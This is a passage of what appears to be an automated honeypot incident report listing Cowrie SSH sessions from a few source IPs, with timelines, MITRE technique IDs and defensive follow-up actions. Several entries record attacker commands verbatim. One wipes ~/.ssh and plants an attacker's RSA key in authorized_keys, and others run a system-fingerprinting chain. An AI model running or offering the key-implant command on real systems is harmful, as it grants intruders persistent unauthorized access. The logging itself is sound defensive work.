| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:00:21` | `cowrie.session.connect` |
| `2026-07-06 06:00:21` | `cowrie.client.version` |
| `2026-07-06 06:00:21` | `cowrie.client.kex` |
| `2026-07-06 06:00:22` | `cowrie.login.success` |
| `2026-07-06 06:00:22` | `cowrie.session.params` |
| `2026-07-06 06:00:23` | `cowrie.command.input` |
| `2026-07-06 06:00:23` | `cowrie.command.failed` |
| `2026-07-06 06:00:23` | `cowrie.log.closed` |
| `2026-07-06 06:00:23` | `cowrie.session.params` |
| `2026-07-06 06:00:23` | `cowrie.command.input` |
| `2026-07-06 06:00:24` | `cowrie.session.file_download` |
| `2026-07-06 06:00:24` | `cowrie.log.closed` |
| `2026-07-06 06:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.224.49[.]7` to AbuseIPDB if not already reported
- [ ] Block `38.224.49[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e558dbd1105d

| Field | Detail |
|---|---|
| **Source IP** | `38.224.49[.]7` |
| **First Seen** | 2026-07-06 06:00 |
| **Last Seen** | 2026-07-06 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:00:24` | `cowrie.session.connect` |
| `2026-07-06 06:00:24` | `cowrie.client.version` |
| `2026-07-06 06:00:24` | `cowrie.client.kex` |
| `2026-07-06 06:00:24` | `cowrie.login.success` |
| `2026-07-06 06:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.224.49[.]7` to AbuseIPDB if not already reported
- [ ] Block `38.224.49[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-598d04b9e337

| Field | Detail |
|---|---|
| **Source IP** | `38.224.49[.]7` |
| **First Seen** | 2026-07-06 06:00 |
| **Last Seen** | 2026-07-06 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:00:24` | `cowrie.session.connect` |
| `2026-07-06 06:00:24` | `cowrie.client.version` |
| `2026-07-06 06:00:25` | `cowrie.client.kex` |
| `2026-07-06 06:00:25` | `cowrie.login.success` |
| `2026-07-06 06:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.224.49[.]7` to AbuseIPDB if not already reported
- [ ] Block `38.224.49[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cba3aa84ad0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:00 |
| **Last Seen** | 2026-07-06 06:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:00:42` | `cowrie.session.connect` |
| `2026-07-06 06:00:42` | `cowrie.client.version` |
| `2026-07-06 06:00:42` | `cowrie.client.kex` |
| `2026-07-06 06:00:45` | `cowrie.login.success` |
| `2026-07-06 06:00:47` | `cowrie.session.params` |
| `2026-07-06 06:00:47` | `cowrie.command.input` |
| `2026-07-06 06:00:47` | `cowrie.command.input` |
| `2026-07-06 06:00:47` | `cowrie.command.input` |
| `2026-07-06 06:00:47` | `cowrie.command.input` |
| `2026-07-06 06:00:47` | `cowrie.command.input` |
| `2026-07-06 06:00:47` | `cowrie.command.success` |
| `2026-07-06 06:00:47` | `cowrie.command.input` |
| `2026-07-06 06:00:47` | `cowrie.command.input` |
| `2026-07-06 06:00:47` | `cowrie.command.input` |
| `2026-07-06 06:00:47` | `cowrie.command.input` |
| `2026-07-06 06:00:48` | `cowrie.log.closed` |
| `2026-07-06 06:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c04e134ce923

| Field | Detail |
|---|---|
| **Source IP** | `8.243.73[.]162` |
| **First Seen** | 2026-07-06 06:01 |
| **Last Seen** | 2026-07-06 06:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:01:12` | `cowrie.session.connect` |
| `2026-07-06 06:01:12` | `cowrie.client.version` |
| `2026-07-06 06:01:12` | `cowrie.client.kex` |
| `2026-07-06 06:01:12` | `cowrie.login.success` |
| `2026-07-06 06:01:13` | `cowrie.session.params` |
| `2026-07-06 06:01:13` | `cowrie.command.input` |
| `2026-07-06 06:01:13` | `cowrie.command.failed` |
| `2026-07-06 06:01:13` | `cowrie.log.closed` |
| `2026-07-06 06:01:14` | `cowrie.session.params` |
| `2026-07-06 06:01:14` | `cowrie.command.input` |
| `2026-07-06 06:01:14` | `cowrie.session.file_download` |
| `2026-07-06 06:01:14` | `cowrie.log.closed` |
| `2026-07-06 06:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.243.73[.]162` to AbuseIPDB if not already reported
- [ ] Block `8.243.73[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2808a65bd055

| Field | Detail |
|---|---|
| **Source IP** | `8.243.73[.]162` |
| **First Seen** | 2026-07-06 06:01 |
| **Last Seen** | 2026-07-06 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:01:14` | `cowrie.session.connect` |
| `2026-07-06 06:01:14` | `cowrie.client.version` |
| `2026-07-06 06:01:14` | `cowrie.client.kex` |
| `2026-07-06 06:01:14` | `cowrie.login.success` |
| `2026-07-06 06:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.243.73[.]162` to AbuseIPDB if not already reported
- [ ] Block `8.243.73[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3469ee52e7e1

| Field | Detail |
|---|---|
| **Source IP** | `8.243.73[.]162` |
| **First Seen** | 2026-07-06 06:01 |
| **Last Seen** | 2026-07-06 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:01:15` | `cowrie.session.connect` |
| `2026-07-06 06:01:15` | `cowrie.client.version` |
| `2026-07-06 06:01:15` | `cowrie.client.kex` |
| `2026-07-06 06:01:15` | `cowrie.login.success` |
| `2026-07-06 06:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.243.73[.]162` to AbuseIPDB if not already reported
- [ ] Block `8.243.73[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23559bd6999

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:01 |
| **Last Seen** | 2026-07-06 06:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:01:29` | `cowrie.session.connect` |
| `2026-07-06 06:01:29` | `cowrie.client.version` |
| `2026-07-06 06:01:29` | `cowrie.client.kex` |
| `2026-07-06 06:01:32` | `cowrie.login.success` |
| `2026-07-06 06:01:34` | `cowrie.session.params` |
| `2026-07-06 06:01:34` | `cowrie.command.input` |
| `2026-07-06 06:01:34` | `cowrie.command.input` |
| `2026-07-06 06:01:34` | `cowrie.command.input` |
| `2026-07-06 06:01:34` | `cowrie.command.input` |
| `2026-07-06 06:01:34` | `cowrie.command.input` |
| `2026-07-06 06:01:34` | `cowrie.command.success` |
| `2026-07-06 06:01:34` | `cowrie.command.input` |
| `2026-07-06 06:01:34` | `cowrie.command.input` |
| `2026-07-06 06:01:34` | `cowrie.command.input` |
| `2026-07-06 06:01:34` | `cowrie.command.input` |
| `2026-07-06 06:01:35` | `cowrie.log.closed` |
| `2026-07-06 06:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b38100ce90

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:02 |
| **Last Seen** | 2026-07-06 06:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:02:16` | `cowrie.session.connect` |
| `2026-07-06 06:02:16` | `cowrie.client.version` |
| `2026-07-06 06:02:16` | `cowrie.client.kex` |
| `2026-07-06 06:02:19` | `cowrie.login.success` |
| `2026-07-06 06:02:21` | `cowrie.session.params` |
| `2026-07-06 06:02:21` | `cowrie.command.input` |
| `2026-07-06 06:02:21` | `cowrie.command.input` |
| `2026-07-06 06:02:21` | `cowrie.command.input` |
| `2026-07-06 06:02:21` | `cowrie.command.input` |
| `2026-07-06 06:02:21` | `cowrie.command.input` |
| `2026-07-06 06:02:21` | `cowrie.command.success` |
| `2026-07-06 06:02:21` | `cowrie.command.input` |
| `2026-07-06 06:02:21` | `cowrie.command.input` |
| `2026-07-06 06:02:21` | `cowrie.command.input` |
| `2026-07-06 06:02:21` | `cowrie.command.input` |
| `2026-07-06 06:02:22` | `cowrie.log.closed` |
| `2026-07-06 06:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5ee7c2b13ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:03 |
| **Last Seen** | 2026-07-06 06:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:03:03` | `cowrie.session.connect` |
| `2026-07-06 06:03:03` | `cowrie.client.version` |
| `2026-07-06 06:03:03` | `cowrie.client.kex` |
| `2026-07-06 06:03:07` | `cowrie.login.success` |
| `2026-07-06 06:03:08` | `cowrie.session.params` |
| `2026-07-06 06:03:08` | `cowrie.command.input` |
| `2026-07-06 06:03:08` | `cowrie.command.input` |
| `2026-07-06 06:03:08` | `cowrie.command.input` |
| `2026-07-06 06:03:08` | `cowrie.command.input` |
| `2026-07-06 06:03:08` | `cowrie.command.input` |
| `2026-07-06 06:03:08` | `cowrie.command.success` |
| `2026-07-06 06:03:08` | `cowrie.command.input` |
| `2026-07-06 06:03:08` | `cowrie.command.input` |
| `2026-07-06 06:03:08` | `cowrie.command.input` |
| `2026-07-06 06:03:08` | `cowrie.command.input` |
| `2026-07-06 06:03:09` | `cowrie.log.closed` |
| `2026-07-06 06:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d5283bef60

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:03 |
| **Last Seen** | 2026-07-06 06:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:03:47` | `cowrie.session.connect` |
| `2026-07-06 06:03:48` | `cowrie.client.version` |
| `2026-07-06 06:03:48` | `cowrie.client.kex` |
| `2026-07-06 06:03:50` | `cowrie.login.success` |
| `2026-07-06 06:03:52` | `cowrie.session.params` |
| `2026-07-06 06:03:52` | `cowrie.command.input` |
| `2026-07-06 06:03:52` | `cowrie.command.input` |
| `2026-07-06 06:03:52` | `cowrie.command.input` |
| `2026-07-06 06:03:52` | `cowrie.command.input` |
| `2026-07-06 06:03:52` | `cowrie.command.input` |
| `2026-07-06 06:03:52` | `cowrie.command.success` |
| `2026-07-06 06:03:52` | `cowrie.command.input` |
| `2026-07-06 06:03:52` | `cowrie.command.input` |
| `2026-07-06 06:03:52` | `cowrie.command.input` |
| `2026-07-06 06:03:52` | `cowrie.command.input` |
| `2026-07-06 06:03:53` | `cowrie.log.closed` |
| `2026-07-06 06:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-764c412eb6a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:04 |
| **Last Seen** | 2026-07-06 06:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:04:31` | `cowrie.session.connect` |
| `2026-07-06 06:04:31` | `cowrie.client.version` |
| `2026-07-06 06:04:31` | `cowrie.client.kex` |
| `2026-07-06 06:04:34` | `cowrie.login.success` |
| `2026-07-06 06:04:36` | `cowrie.session.params` |
| `2026-07-06 06:04:36` | `cowrie.command.input` |
| `2026-07-06 06:04:36` | `cowrie.command.input` |
| `2026-07-06 06:04:36` | `cowrie.command.input` |
| `2026-07-06 06:04:36` | `cowrie.command.input` |
| `2026-07-06 06:04:36` | `cowrie.command.input` |
| `2026-07-06 06:04:36` | `cowrie.command.success` |
| `2026-07-06 06:04:36` | `cowrie.command.input` |
| `2026-07-06 06:04:36` | `cowrie.command.input` |
| `2026-07-06 06:04:36` | `cowrie.command.input` |
| `2026-07-06 06:04:36` | `cowrie.command.input` |
| `2026-07-06 06:04:36` | `cowrie.log.closed` |
| `2026-07-06 06:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de16f335e777

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:05 |
| **Last Seen** | 2026-07-06 06:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:05:14` | `cowrie.session.connect` |
| `2026-07-06 06:05:14` | `cowrie.client.version` |
| `2026-07-06 06:05:14` | `cowrie.client.kex` |
| `2026-07-06 06:05:17` | `cowrie.login.success` |
| `2026-07-06 06:05:19` | `cowrie.session.params` |
| `2026-07-06 06:05:19` | `cowrie.command.input` |
| `2026-07-06 06:05:19` | `cowrie.command.input` |
| `2026-07-06 06:05:19` | `cowrie.command.input` |
| `2026-07-06 06:05:19` | `cowrie.command.input` |
| `2026-07-06 06:05:19` | `cowrie.command.input` |
| `2026-07-06 06:05:19` | `cowrie.command.success` |
| `2026-07-06 06:05:19` | `cowrie.command.input` |
| `2026-07-06 06:05:19` | `cowrie.command.input` |
| `2026-07-06 06:05:19` | `cowrie.command.input` |
| `2026-07-06 06:05:19` | `cowrie.command.input` |
| `2026-07-06 06:05:20` | `cowrie.log.closed` |
| `2026-07-06 06:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3acc02e2716c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:05 |
| **Last Seen** | 2026-07-06 06:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:05:56` | `cowrie.session.connect` |
| `2026-07-06 06:05:57` | `cowrie.client.version` |
| `2026-07-06 06:05:57` | `cowrie.client.kex` |
| `2026-07-06 06:05:59` | `cowrie.login.success` |
| `2026-07-06 06:06:01` | `cowrie.session.params` |
| `2026-07-06 06:06:01` | `cowrie.command.input` |
| `2026-07-06 06:06:01` | `cowrie.command.input` |
| `2026-07-06 06:06:01` | `cowrie.command.input` |
| `2026-07-06 06:06:01` | `cowrie.command.input` |
| `2026-07-06 06:06:01` | `cowrie.command.input` |
| `2026-07-06 06:06:01` | `cowrie.command.success` |
| `2026-07-06 06:06:01` | `cowrie.command.input` |
| `2026-07-06 06:06:01` | `cowrie.command.input` |
| `2026-07-06 06:06:01` | `cowrie.command.input` |
| `2026-07-06 06:06:01` | `cowrie.command.input` |
| `2026-07-06 06:06:02` | `cowrie.log.closed` |
| `2026-07-06 06:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d9a4dcfdb11

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 06:06 |
| **Last Seen** | 2026-07-06 06:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:06:39` | `cowrie.session.connect` |
| `2026-07-06 06:06:40` | `cowrie.client.version` |
| `2026-07-06 06:06:40` | `cowrie.client.kex` |
| `2026-07-06 06:06:42` | `cowrie.login.success` |
| `2026-07-06 06:06:44` | `cowrie.session.params` |
